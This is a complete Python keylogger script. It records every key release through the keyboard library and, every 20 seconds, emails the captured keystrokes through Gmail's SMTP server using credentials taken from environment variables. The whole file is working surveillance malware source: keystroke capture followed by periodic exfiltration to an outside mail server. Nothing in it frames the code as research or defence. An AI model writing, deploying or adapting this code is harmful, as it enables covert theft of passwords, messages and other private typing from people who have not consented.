import keyboard
import smtplib  # for sending email using SMTP protocol (gmail)
import os  # for getting email and password from env vars
from threading import Timer
from datetime import date, datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 20  # in seconds

EMAIL_ADDRESS = os.environ.get('GMAIL')
EMAIL_PASSWORD = os.environ.get('GMAIL_PASSWORD')


def mail_subject():
    current_time = (str(date.today().day) + "-"
                    + str(date.today().month) + "-"
                    + str(date.today().year) + " "
                    + str(datetime.now().hour) + ":"
                    + str(datetime.now().minute) + ":"
                    + str(datetime.now().second))
    return current_time


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        Callback invoked on every key release
        """
        key_name = event.name
        if len(key_name) > 1:  # not a character, special key (e.g ctrl, alt, etc.)
            if key_name == "space":
                key_name = " "

            elif key_name == "enter":
                key_name = "[ENTER]\n"

            elif key_name == "decimal":
                key_name = "."

            else:
                key_name = key_name.replace(" ", "_")
                key_name = f"[{key_name.upper()}]"
        self.log += key_name

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs - " + mail_subject()
        text_part = MIMEText(message, "plain")

        msg.attach(text_part)

        """
        HTML PART OF THE MESSAGE
        Uncomment this for additional info
        
        html = f"<p>{message}</p>"
        html_part = MIMEText(html, "html")
        msg.attach(html_part)
        
        msg.as_string() needed if we want to attach the html part
        """

        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        """
        Function that manages a connection to an SMTP server

        server.set_debuglevel(1):
            debug messages for connection and for all messages sent to and received from the server

        if verbose:
            Provides additional logging information
        """

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.set_debuglevel(0)
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()

        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message} \n")

    def report(self):
        """
        Gets called every self.interval / sends keylogs

        timer.daemon = True:
            dies when main thread dies
        """
        if self.log:
            self.end_dt = datetime.now()
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)

        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
